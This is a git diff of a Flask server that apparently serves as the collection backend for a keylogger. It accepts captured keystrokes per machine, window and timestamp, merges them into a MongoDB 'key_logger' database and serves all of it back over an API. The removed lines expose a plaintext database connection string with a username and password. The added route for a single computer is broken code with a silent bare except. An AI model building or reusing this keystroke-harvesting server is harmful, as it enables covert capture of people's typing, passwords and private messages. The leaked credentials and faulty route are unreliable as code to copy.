@@ -1,17 +1,21 @@
+from dotenv import load_dotenv
 from flask import Flask, request, jsonify
+from flask_cors import  CORS
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
 from bson.json_util import dumps
 import json
-
+import os
 app = Flask(__name__)
-URI = "mongodb+srv://ishaicohen125:Aa12345@cluster0.z4ssc0b.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
+CORS(app)
+
+MONGO_URI = os.environ["MONGO_URI"]
+client = MongoClient(MONGO_URI, server_api=ServerApi("1"))
+db = client["key_logger"]
+db_collection = db["KeyLogger"]
 
 @app.route("/api/computers", methods=["GET", "POST"])
 def home():
-    client = MongoClient(URI, server_api=ServerApi("1"))
-    db = client["key_logger"]
-    db_collection = db["KeyLogger"]
 
     if request.method == "POST":
         new_data = request.get_json()
@@ -31,10 +35,9 @@ def home():
                 if window not in merged_data:
                     merged_data[window] = {}
                 for time in new_data["data"][window]:
-                    if time in merged_data[window]:
-                        merged_data[window][time] += new_data["data"][window][time]
-                    else:
-                        merged_data[window][time] = new_data["data"][window][time]
+                    if time not in merged_data[window]:
+                        merged_data[window][time] = ""
+                    merged_data[window][time] += new_data["data"][window][time]
 
             db_collection.update_one(
                 {"machine_name": new_data["machine_name"]},
@@ -48,6 +51,16 @@ def home():
     elif request.method == "GET":
         all_data = list(db_collection.find({}, {'_id': 0}))
         return jsonify(all_data), 200
+
+
+@app.route("/api/computers/<computer>")
+def get_computer():
+    machine_name = request.args.get("computer")
+    try:
+        computer = db_collection.find({"machine_name": machine_name}, {'_id': 0})
+        return computer
+    except:
+        pass
 
 
 if __name__ == "__main__":
